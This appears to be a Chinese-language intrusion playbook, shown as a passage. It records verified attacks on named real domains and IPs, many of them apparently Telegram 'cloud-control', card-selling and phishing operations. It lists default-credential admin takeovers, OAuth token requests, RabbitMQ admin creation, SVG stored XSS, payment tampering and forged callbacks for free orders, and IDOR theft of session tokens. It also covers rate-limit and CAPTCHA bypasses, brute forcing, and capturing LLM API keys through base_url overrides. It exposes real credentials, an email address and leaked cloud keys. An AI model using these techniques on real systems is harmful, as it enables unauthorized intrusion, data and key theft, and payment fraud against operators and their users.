5. **上传/导出目录无认证** + 附件接口可枚举 = 批量数据下载（tdata/手机号 ZIP/卡密）
6. **空 JSON / 空凭据登录** → 超管 JWT（后端"成功签发"分支缺陷）
7. **多步支付状态不对称**：读接口无鉴权、写接口有校验（join 无密码但 end 要主持人）——先打读面
8. **文档目录常泄露演示凭据**：`/docs/system-guide` → `test@gmail.com/123456` → 触发后续 RCE

---

## 七、芋道 yudao / 若依衍生（Spring Boot 管理系统，GeekIWS 实战）

> 芋道(yudao)/BladeX 等若依衍生框架——**OAuth2 默认客户端 + 云存储密钥接口**是核心突破口。

### 7.1 OAuth2 密码授权绕过验证码 + 默认客户端凭据 → super_admin

**已验证**（GeekIWS wstest.geekws.com）：
```
POST /admin-api/system/oauth2/token
Content-Type: application/x-www-form-urlencoded
tenant-id: 1
grant_type=password&client_id=default&client_secret=admin123&username=admin&password=admin123
→ code:0 + access_token（30分钟，可 refresh）
```
- **要点**：yudao 默认 OAuth2 客户端 `default/admin123` + 初始用户 `admin/admin123`；AJ-Captcha 滑块可完整逆向（AES-ECB 协议），或直接用 token 端点绕过
- **通用检测**：若依系先试 `admin/admin123` + `admin-api/system/oauth2/token`；生产密码已改则试 file-config/未授权上传（见下）

### 7.2 文件配置接口泄露云存储账户级密钥 → COS/S3 全量读写

**已验证**：`GET /admin-api/infra/file-config/get?id=<N>`（管理员 token）→ 返回 `bucket/endpoint/accessKey/accessSecret` 明文。
- 密钥通常为**账户级**（`ListAllMyBuckets`），可读写全部桶 → TG 账号库/聊天媒体全量拖取
- **通用检测**：Spring Boot 管理端找 `file-config`/`oss-config`/`storage-config` 类接口，遍历 id 读密钥

### 7.3 前端 API 加密仅为客户端混淆（服务端接受明文）

**已验证**：`X-Api-Encrypt`（AES）只是前端混淆——服务端接受明文请求，部分端点响应明文泄露。
- **通用检测**：发现前端加密不慌——直接剥加密层发明文，或用未加密的 `/app-api` 面

### 7.4 未授权任意文件上传（测试/生产均复现）

**已验证**：`POST /app-api/infra/file/upload?directory=<可控>` 完全免鉴权 + 任意扩展名 + 目录可控 → 云存储滥用/数据投毒/恶意文件分发。
- **历史入侵证据**：同一向量曾被外部攻击者（IP 27.158.48.235）写 PHP webshell——**桶内历史 webshell 是接管留痕的重要信号**

---

## 八、Node.js 远程协助/客服聊天类（HIH 实战）

> Node.js Express + Socket.IO 远程协助/在线客服应用——**蜜罐登录分离 + 健康/上传无鉴权 + SVG 存储型 XSS**。

### 8.1 蜜罐登录 vs 真实认证分离

**已验证**（HIH trh.com.tw）：`/api/auth/login` 是蜜罐（恒返"帳號或密碼錯誤"），**真实认证是 URL 参数 `?key=xxx` → `/api/auth/key` POST → JWT**。
- **要点**：前端 JS 注释/`honeyLogin()` 函数暴露蜜罐真相；真实入口常藏在 URL key/设备 token
- **通用检测**：客户端 JS 搜 `honey`/`fake`/`key=` 参数 → 找真实认证路径

### 8.2 健康/状态端点无鉴权 + 非法 JSON 泄露服务器路径

**已验证**：`GET /api/handxhand?order=health` 无认证返回服务名/版本/uptime/活跃会话数；发非法 JSON 触发 body-parser 错误泄露完整目录 `/home/projects/node/TP-SW-RemoteService/`。
- **通用检测**：Node 应用找 `?order=health`/`/health`/`/status` 类参数化端点；非法 JSON 触发堆栈泄露（比 500 页更准）

### 8.3 SVG 上传存储型 XSS（白名单含 svg）

**已验证**（.214 TECPEL）：`POST /api/chat/upload` 仅需匿名 userId cookie → 上传 SVG 含 JS → `GET /tmp/chat/xxx.svg` 200 + `Content-Type: image/svg+xml` → 附加到聊天消息 → 客服查看触发 XSS。
- 白名单允许 `.svg/.png/.jpg/.gif/.webp/.txt`，拦截 `.php/.html/.htm/.js/.phtml/.sht` —— **svg 是漏网之鱼**
- **通用检测**：上传接口看扩展名白名单是否含 `svg`（大小写变体 `.SVG` 也测）→ 存储型 XSS 投递面

### 8.4 Socket.IO 无鉴权连接监听事件

**已验证**（.214）：`/socket.io/` 无认证即可连接（返回 sid），可监听 `chat:receive` 等事件 → 观察在线客服对话。
- **通用检测**：`/socket.io/` 直接连 → 看能否收事件；配合 chat 上传 XSS 形成窃听链

### 8.5 关联资产 EOL 软件（Apache 2.2 + PHP 5.6）

**已验证**（oka.com.tw）：Apache 2.2.15 + PHP 5.6.40（EOL 多年）→ 大量已知 CVE 面。**同运营者/同段 IP 的 EOL 站是弱链**，即使主站加固。

---

## 九、USDT 支付/发卡站附加模式（gxgxr / 38.55.199.90 实战）

### 9.1 支付价格篡改（客户端价格字段）

**已验证**（gxgxr FastAdmin）：`POST /assets/libs/trade/pay.php` 的 `total_price`/`unit_price`/`num`/`goods_id` 全部客户端可控 → 任意商品 `0.01`/`0`/`-5` 下单 → epay 收银台按客户端价 → 支付即发货。
- **通用检测**：下单请求看价格字段是否服务端重算（acg-faka 3.4.9 已重算证伪，FastAdmin 自研支付常漏）
- **要点**：自研支付系统（非成熟框架）价格校验最薄

### 9.2 USDT 收银台页面内嵌配置泄露（bot_key/payment_address/private_key）

**已验证**（gxgxr）：`GET /epay/{orderid}.php` 无需认证 → 页面内嵌 options JSON 含 **TG bot_key + payment_address + permission_address + private_key + notification_id** → 完全控制运营者 TG Bot（伪造支付播报/劫持 webhook/群发钓鱼）。
- **通用检测**：Epay/USDT 收银台页面源码搜 `bot_key`/`payment_address`/`private_key`/`authorized_amount`
- **联动**：配合开放 TG 代理端点（`bot.php` 接受任意 botKey/chatId）→ 任意 bot 发消息

### 9.3 支付插件运行时日志泄露商户密钥（acg-faka）

**已验证**（38.55.199.90）：`/app/Pay/Epay/runtime.log` **无鉴权公开可读** → 日志记录预检请求 URL 含 `key=<商户密钥>` → 用密钥按彩虹易支付签名算法（ksort→k=v&k=v→md5）离线复算 → 伪造任意回调 → 免费出卡。
- **通用检测**：找支付插件目录 `/app/Pay/*/runtime.log` 或任意 `*.log`（全局禁 `*.log` 才是修复）
- **签名算法**：易支付 `ksort(排除 sign/sign_type/空值) → k=v&k=v 拼接 → 后接 key → md5`——所有 acg-faka+易支付站通用

### 9.4 未鉴权订单查询 + 卡密直出（acg-faka 系）

**已验证**（38.55.199.90 / maojuid）：`POST /user/api/index/query` 用 UserVisitor（免登录）拦截器，`keywords` 传 18 位订单号或 contact（手机/邮箱）→ 返回已支付订单含 `secret` 卡密（仅当设了查询密码才剔除）。
- **通用检测**：发卡站 `query` 接口 → 输入邮箱/订单号 → 看响应是否含卡密；`secret` 字段存在但未校验归属 = 高危

---

## 十、接码/账号平台附加模式（牡丹接码 / id10 实战）

### 10.1 "获取用户信息"接口未鉴权 IDOR 返回会话 token

**已验证**（牡丹接码）：`POST /api/login/getUserInfo?ajax=1` 仅传 `user_id` 无认证 → 返回完整资料 + **有效会话 token** → 写进 localStorage 即"已登录"，可读全部短信验证码/消费记录/API 密钥/注销账号。遍历 `user_id=1..30` 全量拖取。
- **通用检测**：接码/账号/钱包类平台找 `getUserInfo`/`getUser`/`profile` 类接口 → 无 token 传 user_id 试 → **响应含 token 字段本身就是缺陷信号**
- **影响**：对接码平台是釜底抽薪级——用户付费买验证码，攻击者免费拖全部

### 10.2 登录用户枚举 + admin 用户名枚举（无 IP 限速）

**已验证**（牡丹接码 / gxgxr）：`密码错误!` vs `用户不存在!` / `用户名不正确` vs `密码不正确` → 差异枚举；失败 5 次锁账号但**无 IP 级限速** → 换用户名批量爆破。
- **通用检测**：登录错误消息分两种 = 可枚举；锁定是账号级非 IP 级 = 可换名爆破

### 10.3 发卡站卡密拓线内部系统（id10）

**已验证**（id10.cn）：`search-order-by-email` 无搜索密码验证 → 635 条已售卡密 → **卡密内含内部 API URL** → 拓线到运营者内部系统（orangeid.top 设备码加工 + 38.181.42.20 旧系统）。
- **通用检测**：发卡站已售卡密本身就是情报源——搜 `http`/`api`/域名拓线；订单搜索接口无密码 = 免费情报
- **联动**：内部系统开放注册 + 登录无限速爆破 `test/123456`（user_id=1 运营者主账号）→ `/api/accounts` 越权导出全量 + getcode IDOR 任意验证码

### 10.4 前端静态资源泄露桶名 → 云存储公开桶

**已验证**（YouYouLai）：前端 JS 一张 SVG 图片 URL 暴露 GCS 桶名 `tg-server-storage` → 桶公开读写 593,922 对象 → 内含**数据库 dump + 服务账号私钥 + TG session 文件**。
- **通用检测**：前端 JS 搜 `storage.googleapis.com`/`s3.*`/`cos.*`/`oss.*` 静态资源 URL → 反查桶 ACL → 公开桶内常藏 dump/私钥/session
- **联动**：桶内 `common/googleKey/*.json` = GCP 服务账号私钥（RSA-2048）→ 验权限 → 横向云资源

---

## 十一、多端口多应用弱口令复用 + FastAPI 泄露面（72.56 实战）

### 11.1 同服务器多端口应用弱口令复用

**已验证**（72.56.111.41）：`admin/admin123` 在 8000（Gensim NLP）和 8001（Yandex Maps Bot）**两个应用复用** → 双应用完整接管。
- **通用检测**：多端口多应用服务器，一个应用的弱口令**全端口试**——运营者常统一口令
- **联动**：接管后找数据库/Redis 连接串（`postgresql://`/`redis://`）+ AI key + 代理配置 → 业务数据全泄露

### 11.2 FastAPI /openapi.json + /docs 泄露完整 API 面

**已验证**（72.56 / 715TG / 118.195 等多台）：FastAPI 登录后 `/openapi.json` + `/docs` 暴露 50+ 端点，含 `reset-database`/`clear-all-profiles` 等破坏性操作。
- **通用检测**：FastAPI 指纹 → `/openapi.json` `/docs` `/redoc` 直接拉全端点清单，比黑盒快一个量级

### 11.3 配置接口泄露 vs 环境变量密钥（分层排查）

**已验证**（72.56）：`/api/settings` 明文泄露 Capsola 验证码 API key（DB 层），而 Gemini/DeepSeek key 在**服务器环境变量**（需 RCE 提取）——**密钥分两层存储，先打 DB 层再考虑 RCE**。
- **通用检测**：拿到应用配置先看哪些 key 在 DB、哪些在 env——DB 层 key 直接拿，env 层留作 RCE 目标

---

## 十二、CMS 类（DedeCMS / WordPress，yunkon88 / haixiangweb 实战）

### 12.1 DedeCMS 后台默认口令接管 + 厂商加固识别

**已验证**（yunkon88 星火出海）：`POST /dede/login.php userid=admin&pwd=123456` 无验证码/无CSRF/无锁定 → 完整后台（10,923 文章/媒体/会员管理）。
- 版本指纹：`/data/admin/ver.txt` → 20170405（5.7 SP2 构建日期）
- **厂商加固识别**（云驰力变体）：`make_hash()` 被破坏 → SQL 运行器/模块安装/广告/标签/CSRF 全废；模板编辑器 `tpl.php`/文件管理器禁用；上传强制存 `.gif`（swfupload 收 polyglot 但存图片扩展名，nginx 不执行）→ **RCE 被阻断但后台接管成立**
- **通用检测**：DedeCMS 后台目录 `/dede/` 先试 `admin/123456`；登录页自身提示"建议修改该目录名"= 未改名；信息泄露经 `ajax_membergroup.php` 参数触发 fatal 泄路径

### 12.2 WordPress xmlrpc multicall 爆破放大 + 无锁定

**已验证**（haixiangweb）：`POST /xmlrpc.php system.multicall` 携带 20 组 `wp.getUsersBlogs` 登录尝试 0.56s 完成（~20x 放大），~4600 次失败登录**全程零锁定**；`GET /wp-json/wp/v2/users` + `/?author=1` + `wp-sitemap-users-1.xml` 三通道确认管理员用户名。
- **通用检测**：WP 站先三通道枚举用户 → xmlrpc multicall 爆破放大（先确认无 wordfence/limit-login 类插件）
- **插件 SQLi 潜伏项**：mystickymenu 2.6.7 CVE-2026-3657 未认证 SQLi（`wp_ajax_nopriv_stickymenu_contact_lead_form` 键未校验入列名）——当前因 welcomebar 未配置不可利用，启用即变盲注点

---

## 十三、消息队列/中间件暴露（shop.ioiaa 实战）

### 13.1 RabbitMQ 管理台默认凭据 guest/guest 接管

**已验证**（shop.ioiaa）：`GET http://target:15672/api/overview`（Basic guest:guest）→ 200；`PUT /api/users/testadmin` → 201 创建管理员。guest 为 administrator 角色，应用容器也以 guest/guest 连接。
- **影响**：全平台消息队列管理权——订单批量队列/广播队列可控、篡改订单消息流、DoS
- **通用检测**：端口 15672 公网 → guest/guest 直测；同段 3306/6379 一起探（该站 MySQL 5.7.40 EOL + Redis 公网暴露）

### 13.2 注册响应明文回显密码哈希

**已验证**（shop.ioiaa）：`POST /api/client/register` 响应含 `"password":"$2y$10$..."`（bcrypt 哈希明文回显）→ 若管理端点 `getClientList` 同构回显，可离线爆破任意账户。
- **通用检测**：注册/资料接口响应搜 `password`/`hash`/`secret` 字段——响应泄露哈希=离线爆破面

---

## 十四、验证码与登录机制对抗（yyids 彩虹TG云控 实战）

### 14.1 SVG 验证码答案明文内嵌（text 元素）

**已验证**（register.yyids.com）：`GET /api/captcha` 返回 `image/svg+xml`，答案字符直接以 `<text>n</text><text>k</text>...` 明文内嵌 → 解析 4 个 text 元素即得答案 → 脚本化自动注册。
- **通用检测**：验证码接口返回 SVG/XML → 搜 `<text>` 元素/明文答案字段

### 14.2 X-Forwarded-For 伪造绕过注册限流

**已验证**（yyids）：注册"2 次/IP/24h"限流取 `X-Forwarded-For` 头 → 伪造随机 IP 无限注册。
- **通用检测**：IP 限流先测 `X-Forwarded-For`/`X-Real-IP`/`Client-IP` 头是否被信任

### 14.3 自定义 Channel 头隐藏登录判定（yudao/gva 系）

**已验证**（yyids yk 后台）：`POST /api/auth/login` 缺 `Channel: pc` 头 → 所有输入统一返回"系统错误"（隐藏真实判定）；带对头才暴露"验证码失效/密码错误"。
- **通用检测**：登录接口恒定"系统错误"时 → 看前端 axios 拦截器注入的自定义头（`Channel`/`X-Channel`/`source`）；**gva(Gin-Vue-Admin) 系常带 `source:1` 字段 + Channel 头**

### 14.4 前端 md5 混淆 = 明文直存

**已验证**（yyids）：注册把收到的 password 原样存、登录原样比；前端两处 md5 只是混淆 → 明文登录成功、md5 反而失败。
- **通用检测**：登录响应区分明文 vs md5 两种 payload——明文成功 = 服务端明文存储/比对

### 14.5 低权限 IDOR 用户枚举（user 角色拉全站）

**已验证**（yyids）：`POST /api/user/list` 用 user 角色 JWT 拉全站 ~195 用户（username/email/phone/loginIp）→ PII 泄露。
- **通用检测**：拿到任意低权限 token → 试 `/user/list`/`/users`/`/members` 类列表接口是否越权

### 14.6 ddddocr + 预处理实现验证码 OCR ~100%

**已验证**（yyids）：4 位纯数字彩色旋转字符验证码 → `ddddocr` + "按颜色分割→置黑" 预处理 → 40+ 次登录闭环零失败。
- **通用检测**：数字验证码优先 ddddocr；字符带旋转/干扰线时先颜色分割预处理再 OCR
- **历史攻击痕迹信号**：目标已有 id=95 攻击者用 admin `/user/add` 造 `roles=[admin,user]/[super]` 测试账号——**历史提权账号是可爆破目标，也是攻击痕迹**

---

## 十五、防加固目标的剩余面（xgtgyk / yuntg / nexcheck 反面案例）

> 这三家 TG 云控/筛号平台防护到位（认证门禁+强口令+严格限速），完整接管未达成。提炼**加固目标仍留的面**——快速确认是否值得继续，避免死磕。

### 15.1 /api/readyz + /api/healthz 泄露内部服务拓扑

**已验证**（yuntg）：`/api/readyz` 公开返回内部服务依赖拓扑（哪个服务 ready/not ready），`/api/healthz` 泄露内部服务名 → 用于确认攻击面布局。
- **通用检测**：K8s/微服务应用先打 `/api/readyz` `/api/healthz` `/actuator/health` `/debug/pprof`——readyz 常比 healthz 信息多

### 15.2 登录参数 Null 字节绕过限速器

**已验证**（yuntg）：登录用户名含 `\x00` → HTTP 500（限速器按用户名/参数计数时被绕过）→ 无限爆破面。
- **通用检测**：限速按输入参数计数时，试 `%00`/Null 字节/超长参数触发 500 → 绕过计数

### 15.3 X-Uim 反扫描头（WebRTC IP 指纹 base64）

**已验证**（nexcheck）：响应头 `X-Uim` 携带 base64 编码的 WebRTC IP 指纹——识别反扫描机制时先解 base64 看是否泄露访问者真实 IP。
- **通用检测**：陌生响应头（`X-Uim`/`X-` 前缀自定义头）一律 base64 解码看内容——常是指纹/内部信息

### 15.4 防御良好目标的止损信号（三平台共性）

| 信号 | 含义 |
|------|------|
| 注册关闭/邀请制 | yyids 的开放注册漏洞不存在——逻辑面收窄 |
| 登录限速 + 强口令 + 验证码三件套 | 爆破面关闭——除非找到 Null 字节/竞态绕过 |
| 无未授权 API + 无 IDOR + 无 mass-assignment | 逻辑层无面——转基础设施（readyz/暴露端口）或止损 |
| 历史攻击者账号残留 | 若有（如 id=95 造的 admin 账号）→ 优先爆破这些历史账号 |

---

## 十六、硬编码密钥加密配置文件拓线（qf 压力测试实战）

### 16.1 config_data.json 硬编码密钥 → 解密域列表 → 拓线真实后端

**已验证**（qf-website-pressure.cg6.co / qf.wg.com / client.bev6.com）：前端/静态站 `config_data.json` 用**硬编码密钥加密** → 解密后得到压力 API 域列表（`zpydbnrc-stress.cg6.co` 等）→ 从测试环境拓线到生产营销站与客户端。
- **通用检测**：前端 JS/静态资源找 `config_data.json`/`config.json`/`settings.json` → 看是否含加密字段 → 密钥常在 JS bundle 里（搜 `encrypt`/`AES`/`secret`/`key`）→ 解密后域列表就是真实资产清单
- **联动**：客户端 bundle 文档化 235+ API 端点（WhatsApp/Telegram 群控）→ 端点清单即攻击面地图

---

## 十七、Chatwoot / 客服系统接管（whaspasapp 实战）

### 17.1 Chatwoot 未授权账户创建 + SQLi 跨租户 + access_tokens 接管

**已验证**（whaspasapp.com 源站 154.198.162.39，Chatwoot 4.3.0）：
- **F1**：`/api/v2/accounts` 未限流建号 + 响应回显 `access_token` → 注册即得管理员 token
- **F2**：CVE-2026-44706 SQLi → 跨租户读 `access_tokens` 表 → 窃取 admin API token
- **F3**：`{"access_token":"...","email":"zichen25800@gmail.com","id":1,"account_id":1,"role":"administrator"}` → 完整读写后台
- **持久性**：admin token **45 天未轮换仍有效**（运营者不轮换 = 一次性接管长期可用）
- **通用检测**：Chatwoot 系先试 `POST /api/v2/accounts`（未限流建号）→ `access_tokens` 表 SQLi（CVE-2026-44706）→ 拿 token 后查 email/role 确认管理员

### 17.2 nginx 下划线头绕过（proxy 配置差异）

**已验证**（whaspasapp）：nginx 默认丢弃 `X_` 下划线头（传给后端时被忽略），但后端直接读原始头 → 用下划线头注入后端信任的认证字段绕过。
- **通用检测**：前端验证 + 后端读头的认证系统，试 `X_Forwarded_For`/`X_Admin`（下划线） vs `X-Forwarded-For`/`X-Admin`（连字符）差异——下划线头常绕过 WAF/代理校验

---

## 十八、发卡/商城验证码与卡密泄露（etisss 鲸商城PRO 实战）

> 鲸商城PRO = 鲸发卡 v11.61 换代产品（同代码库，本地源码可审计）。**验证码破解是万能钥匙**——解锁全部"人机验证"端点。

### 18.1 组件验证码 sign salt 硬编码 → ticket 万能钥匙

**已验证**（etisss）：验证码签名 salt=`JING` 硬编码在 JS → 可自算 ticket → 绕过所有带验证码的端点（下单/查询/登录预检）。
- **通用检测**：前端验证码组件（无感/滑块/点选）找签名 salt（JS 搜 `salt`/`sign`/`ticket`）→ 自算 ticket 万能钥匙；配合 ddddocr 双保险

### 18.2 shopApi 零鉴权 + selectCards 泄露未售卡密

**已验证**（etisss）：`shopApi` 18 端点零鉴权（商品/库存/分类/价格/渠道全量读取）；`selectCards` 泄露**未售卡密**完整内容（含二级密码 + 接码 API token）。
- **通用检测**：发卡商城找 `shopApi`/`goodsList`/`selectCards` 类端点 → 零鉴权直读 + selectCards 拉未售卡密（比已售卡密更有价值——可直接用）

### 18.3 接码 token 活性 → 手机号接管

**已验证**（etisss）：卡密内接码 API token 实测存活 → TGCode 接码服务可直接收码 → 手机号接管。
- **通用检测**：拿到任何接码平台 token → 立即验证活性（`getBalance`/试收码）→ 活性 token = 任意手机号验证码接管

### 18.4 回调端点 GET 参数 + 只验签即发货（鲸发卡系）

**已验证**（etisss）：`/payApi/Yipay/notify` 接受 GET 参数 + 静默验签——**只验签即 completeOrder，不校验金额/状态/来源** → 有 KEY 即 0 元购（每单限购 1-5 张）。
- **通用检测**：发卡系统回调端点用 GET 触发试（不限于 POST）；"只验签不校验金额"是鲸发卡/独角数卡家族通病
- **联动**：支付表单页泄露 pid/notify_url/网关 → 0 元购前置情报

### 18.5 用户枚举多 oracle + 登录限速 XFF 绕过

**已验证**（etisss）：`checkSafeMode`/`email send`/`invite token` 三个独立 oracle 确认用户名 `admin/thjm`；登录限速 per-IP 但 **XFF 伪造完全绕过** → 112k 字典无限爆破。

---

## 十九、实时消息通道无鉴权窃听（whats.ink Pusher 实战）

### 19.1 Pusher 实时频道无鉴权订阅（客服对话窃听面）

**已验证**（whats.ink WhatsApp 钓鱼站）：`wss://whats.ink:9090/app/<key>` Pusher 连接成功 → `se1-se50+` + `cu` 频道全部可订阅 → 客服状态 + 受害者对话实时窃听（当前运营者离线）。
- **通用检测**：WebSocket 服务（Pusher/Socket.IO/自研）→ 先试无鉴权连接 → 枚举频道命名规律（`se{N}`/`cu`/`room{N}`）→ 订阅即窃听
- **钓鱼站配套**：`phoneEntry` → mobile 聊天 → 客服后台 `/service/login/index.html`——假客服对话就是受害者数据源

### 19.2 4 位扭曲验证码 ddddocr ~70%（可叠加 OCR）

**已验证**（whats.ink）：4 位扭曲验证码 ddddocr 破 ~70%，登录无限速 3s wait → 爆破进行中（36 用户 × 115 口令 miss，后台强口令）。
- **通用检测**：ddddocr 对 4 位数字/字符验证码通常 ≥70%；配合多引擎交叉验证提升到 ~100%（见 14.6 颜色分割预处理）

---

## 附录 A：漏洞类型速查（横切反查索引）

> 前面章节按**业务类型/框架/站点**组织（正向：拿到目标 → 查该打什么）。本附录按**漏洞类型**横切（反向：想复用某类漏洞的所有历史打法 → 查这里）。命中频率由高到低，即真实突破口排序：**IDOR > SSRF/base_url覆写 > 弱口令 > OpenAPI暴露 > 支付签名伪造 > JWT缺陷 > 无限速爆破 > 前端硬编码密钥**。系统CVE型（RCE链/反序列化/路径遍历）反而低频。

### A. 业务逻辑（最高价值主力）

| 类型 | 手法要点 | 实战站点 |
|------|---------|---------|
| **IDOR / BOLA** | 改 id/sn/email/client 参数或省鉴权前缀读他人数据 | max77(NA.前缀,2100万)、meiqia/mlkfcs(跨会话)、peony(全22用户token)、alisa(client=widget)、id10(/api/accounts导1056)、luobokuaice(screenlog) |
| **支付签名伪造/金额篡改** | 密钥可逆或 md5(参数排序)无密钥→伪造回调零元购 | dujiaoka≤2.0.4、dujiao-next(1元购)、maojuid/gxgxr/教授小店38.76/142.171(epay) |
| **Mass Assignment 提权** | 注册体塞 role:admin/is_admin | tg-filter、ws-screener |
| **限流键缺陷** | 完整URL为键→追加参数绕过；XFF伪造 | max77(追加参数)、tg.lsttt/doms.buzz/70.39(XFF) |
| **OTP/验证码逻辑** | 无锁定/可爆破/明文回显/OCR可破 | f1-sms/yysx/whats.ink(OCR)、49.7.226.13(绕过)、yyids(SVG明文) |

### B. 认证与会话

| 类型 | 手法要点 | 实战站点 |
|------|---------|---------|
| **弱口令/默认口令** | admin/admin·admin/admin123·产品名+年份；timing先确认admin存在 | 精客云/agentsrepos/yunkon88(admin/admin)、ios002/ai-aftersales/wsapp-checker/82.152(admin123)、154.12.27.77(root/123456) |
| **JWT缺陷** | 硬编码/弱/空签发/跨部署共享；试alg=none | tgonlypro(your_secret_key)、catchat(123456)、VI钱包(空{}签超管)、183.179(NEXTAUTH跨部署) |
| **会话导出免密** | 后台导出session/tdata→免密接管 | tg-filter(batch-export)、tg507mx(tdata含2FA)、manager-711tock、youyoulai |
| **用户枚举** | timing/回显差异缩爆破范围 | 154.12.27.77/metaimax/jiaotuai(timing)、tg-haiapp/nexcheck(回显) |

### C. 注入

| 类型 | 手法要点 | 实战站点 |
|------|---------|---------|
| **SQLi** | 错误型/UNION/盲注；ThinkPHP+DEBUG最肥,updatexml+括号替空格绕WAF | 85amz(TP5.0.24 APP_DEBUG拖全库)、142.171(UNION)、whaspasapp(CVE-2026-44706)、49.7.226.13 |
| **RCE/命令注入/代码执行** | 沙箱逃逸/模板/上传执行；已知框架CVE | 183.179(JS沙箱+root)、agentsrepos(run端点root)、peiioh(TP5.0.15未成) |
| **SSTI/反序列化** | {{7*7}}/${}探针；PHP找unserialize入口+POP链 | 154.12.84.187(TP8反序列化未成)、echoes-of-heap(堆溢出靶场) |

### D. SSRF / 服务端请求

| 类型 | 手法要点 | 实战站点 |
|------|---------|---------|
| **SSRF+云元数据/内网** | url/proxy/webhook/import参数打169.254.169.254/内网/外部回连 | scoutip(Yandex元数据)、jobescape、nzyk(代理检测)、172.245(6667)、82.152(盲SSRF) |
| **base_url覆写取LLM key** | AI系统改base_url指自控服务器,nc/webhook捕获Authorization | ai-content(8.160)、dramatica、geo-publisher、litellm(Host头)、EMA、94.101 |

### E. 配置与信息暴露

| 类型 | 手法要点 | 实战站点 |
|------|---------|---------|
| **OpenAPI/docs暴露** | 先探/docs /openapi.json /redoc,提端点+默认凭据 | 176.122(凭据写死openapi)、8.138/tgonlypro/auctus/yysx/82.152 |
| **Debug模式** | 触发500看堆栈；Django试Host头；Werkzeug试/console | 85amz(APP_DEBUG)、94.101(Django Host:localhost)、172.245(Werkzeug)、jobescape |
| **前端硬编码密钥** | 抓JS grep key/secret/salt/private/token/appid | ceoscrm(anon key+salt)、85amz(支付宝RSA私钥)、max77(md5无密钥)、yuntg/luobokuaice(RSA私钥) |
| **云存储公开** | 找桶名试匿名list/get/put；Cognito试GetId+GetCredentials | hushchat(Cognito 11桶23.5万)、youyoulai(GCS+服务账号私钥)、jobescape(S3) |
| **.git/备份泄露** | 探/.git/config /.svn .bak/.zip 目录列表 | luobokuaice、103.140(assets列表+备份) |

### F. 客户端 / 前端

| 类型 | 手法要点 | 实战站点 |
|------|---------|---------|
| **存储型XSS** | 上传SVG/.tml,输入试<img onerror>,盲打挂平台 | 207.56/appsir(SVG上传)、amrous(js-error盲打中sync_bot)、xiaoyi(donate) |
| **文件上传绕过** | 改content-type/双后缀/大小写/.phtml看能否解析 | appsir(text/httpd-php→.php)、jingkeyun(CVE-2020-11427) |
| **Webhook签名缺陷/WS冒充** | 删signature头看是否仍200;WS连上冒充他人id | trioloo(省头即200)、alisa(无HMAC+WS冒充)、jobescape(funnel无鉴权) |

### G. 路径遍历 / 访问控制

| 类型 | 手法要点 | 实战站点 |
|------|---------|---------|
| **路径遍历/任意文件读** | 下载/预览/日志参数试../../etc/passwd、..%2f、绝对路径 | scoutip(受限文件读)、94.101(Host绕过读settings) |
| **未授权访问/BFLA** | 只验"已认证"不验"能否调此函数";低权用户直调高权端点 | 176.122(全API无鉴权26万PII)、118.195(设备控制RCE)、tgonlypro(admin→superadmin)、xiaoqiclass(/api/send MQTT RCE)、114.132(全API零鉴权) |

### 用法定式
- 接新目标先按频率从上往下试：**IDOR → SSRF → 弱口令 → OpenAPI → 支付签名**
- AI/LLM系统优先 **D(base_url覆写)+E(DEBUG)**；发卡/支付优先 **A(签名伪造)**；TG云控优先 **B(会话导出)+A(IDOR)**
- 具体站点续打细节查 memory 里对应 `*-pentest-engagement.md`
